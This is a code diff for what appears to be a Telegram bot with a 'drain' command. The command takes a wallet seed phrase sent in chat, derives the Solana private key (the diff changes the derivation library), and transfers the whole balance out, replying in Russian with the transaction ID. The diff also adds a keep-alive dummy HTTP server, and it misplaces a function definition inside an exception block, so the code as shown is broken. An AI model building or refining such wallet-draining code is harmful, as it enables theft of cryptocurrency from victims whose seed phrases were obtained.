@@ -113,9 +113,10 @@ async def drain_cmd(message: types.Message):
 
     seed = parts[1].strip()
     try:
-        hd = HDWallet(cryptocurrency="SOL", strength=128)
-        hd.from_mnemonic(seed, language="english")
-        kp = Keypair.from_secret_key(base58.b58decode(hd.private_key()))
+        seed_bytes = Bip39SeedGenerator(seed).Generate()
+        bip44_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.SOLANA)
+        private_key_bytes = bip44_mst.PrivateKey().Raw().ToBytes()
+        kp = Keypair.from_secret_key(private_key_bytes)
         
         balance = client.get_balance(kp.public_key).value
         if balance <= 5000:
@@ -131,9 +132,11 @@ async def drain_cmd(message: types.Message):
         await message.answer(f"✅ Отправлено {balance/1e9:.4f} SOL\nTX: `{sig.value}`", parse_mode="Markdown")
     except Exception as e:
         await message.answer(f"❌ Ошибка: {e}")
-
-async def main():
-    await dp.start_polling(bot)
+        def run_dummy_server():
+    port = int(os.environ.get("PORT", 8080))
+    server = HTTPServer(('0.0.0.0', port), BaseHTTPRequestHandler)
+    server.serve_forever()
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    threading.Thread(target=run_dummy_server, daemon=True).start()
+    asyncio.run(dp.start_polling(bot))
